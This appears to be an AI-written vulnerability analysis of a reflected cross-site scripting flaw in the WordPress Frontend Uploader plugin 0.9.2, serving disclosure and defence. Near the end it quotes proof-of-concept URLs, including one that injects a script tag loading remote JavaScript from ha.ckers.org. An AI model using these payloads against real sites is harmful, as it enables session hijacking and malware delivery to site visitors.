Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:** The vulnerability is due to a lack of proper input sanitization in the WordPress Frontend Uploader plugin when handling error messages related to disallowed mime types.

**Weaknesses/Vulnerabilities Present:**
*   **Cross-Site Scripting (XSS):** The plugin fails to sanitize user-supplied input within the `errors[fu-disallowed-mime-type][0][name]` parameter, allowing an attacker to inject malicious JavaScript code.

**Impact of Exploitation:**
*   **Arbitrary JavaScript Execution:** An attacker can inject and execute arbitrary JavaScript code within the context of a user's browser.
*   **Session Hijacking:** This can lead to session hijacking, allowing the attacker to impersonate the user and perform actions on their behalf.
*   **Defacement:** The attacker could potentially deface the website.
*   **Malware Distribution:** The attacker could redirect the user to malicious sites, potentially leading to malware infection.

**Attack Vectors:**
*   **HTTP GET Request:** The attacker crafts a malicious URL that includes the XSS payload within the `errors[fu-disallowed-mime-type][0][name]` parameter.
*   **Target:** Any user who accesses a page using the vulnerable plugin that triggers the display of the error message.

**Required Attacker Capabilities/Position:**
*   The attacker needs the ability to craft a specific URL with the XSS payload.
*   No special privileges are required, the attack can be triggered through a normal HTTP request.

**Technical Details:**

The exploit URL provided in the content demonstrates how to inject malicious javascript:
`http://TARGET/[forntEndUploaderPage]=59&amp;errors[fu-disallowed-mime-type][0][name]=XSS`

The PoC also illustrates a concrete example using a script from `ha.ckers.org`:
`http://EXAMPLE/wordpress/?page_id=59&amp;&amp;errors[fu-disallowed-mime-type][0][name]=%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js?%3C%20B%20%3E`

This clearly shows the lack of sanitation on the `name` parameter of the `fu-disallowed-mime-type` error.

The vulnerability is present in version 0.9.2 of the plugin.
